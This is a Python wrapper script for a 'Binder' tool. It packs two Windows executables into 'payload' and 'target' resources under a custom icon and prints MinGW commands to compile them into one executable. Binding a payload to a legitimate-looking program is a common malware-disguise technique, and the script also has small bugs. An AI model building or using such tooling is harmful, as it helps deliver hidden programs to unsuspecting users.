#!/usr/bin/python

import argparse,sys
import os
import subprocess
import shutil

class Main:

    def __init__(self, quiet = False):

        self.quiet = quiet
        self.output = ""
        self.noicon = False

        self.RESOURCE_FILE_PATH = "res.rc"
        self.RESOURCE_OBJ_PATH = "res.o"
        self.BINDER_SRC_PATH = "binder.c"
        self.ICON_PATH = "target_icon.ico"
        self.TARGET_BINARY_RES_PATH = "target.txt"
        self.PAYLOAD_BINARY_RES_PATH ="payload.txt"
        self.FLAGS = "-lshlwapi"

        self.res_content = []

    def execute(self):
        """Here, we parse the commandline options and react according to them"""

        parser = argparse.ArgumentParser(description="A simple wrapper for 'Binder', which will recompile the Binder with two Windows binaries given in arguments")

        parser.add_argument("binary1", help="path to binary1")
        parser.add_argument("binary2", help="path to binary2")

        parser.add_argument("-o", "--output", metavar="OUTPOUT FILENAME", default="output.exe", help="name of output binary", dest="output")
        parser.add_argument("-i", "--icon", metavar="ICON", help="path to desired icon to output binary", dest="icon", default="")

        options = parser.parse_args()

        self.output = options.output

        #debug
        print (options.binary1)
        print (options.binary2)
        print(options.output)
        print(options.icon)

        if options.icon == "":
            self.noicon = True

        for path in [options.binary1, options.binary2, options.icon]:
            
            if path == options.icon and self.noicon == True:
                continue

            if os.path.exists(path):
                self.copy_binary(path)
            else:
                print("[!] " + path + " not found")
                print("[!] Exiting....")
                return
        
        self.make()


    def copy_binary(self, filepath):
        """
        filepath : path to file to copy
        """

        basename = filepath.split('.')[0]
        ext = filepath.split('.')[1]
        output = ""

        if ext == 'ico':
            output = self.ICON_PATH
        else:
            output = basename + '.txt'
        
        shutil.copyfile(filepath, output)

    def rsc_content_init(self):
        self.res_content.append("#include <winnt.h>\n")
        self.res_content.append("#include resource.h\n")
        self.res_content.append('IDR_PAYLOAD\tRCDATA\t"'+self.PAYLOAD_BINARY_RES_PATH+'"\n')
        self.res_content.append('IDR_TARGET\tRCDATA\t"'+self.TARGET_BINARY_RES_PATH+'"\n')

        if self.noicon == False:
            self.res_content.append('MAIN_ICON\tICON\t"\n' + self.ICON_PATH + '"')
                
    def make_rsc_file(self):

        self.rsc_content_init()

        with open(self.RESOURCE_FILE_PATH, "w") as f:
            f.writelines(self.res_content)
            
    def make(self):

        self.make_rsc_file()
        #main.c -o main.exe res.o -lshlwapi
        #x86_64-w64-mingw32-windres res.rc res.o
 #       commands.getstatusoutput("x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH)  
  #      commands.getstatusoutput("x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS)
        #args = ['gdb', '-q', filename]
        #p = subprocess.Popen(args,  stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

        print("x86_64-w64-mingw32-windres {resfile} {resobj}".format(resfile=self.RESOURCE_FILE_PATH, resobj=self.RESOURCE_OBJ_PATH))  
        print("x86_64-w64-mingw32-gcc {src} -o {output} {objres} {flag}".format(src=self.BINDER_SRC_PATH, output=self.output, objres=self.RESOURCE_OBJ_PATH, flag=self.FLAGS))
if __name__ == "__main__":
    main = Main()
    main.execute()
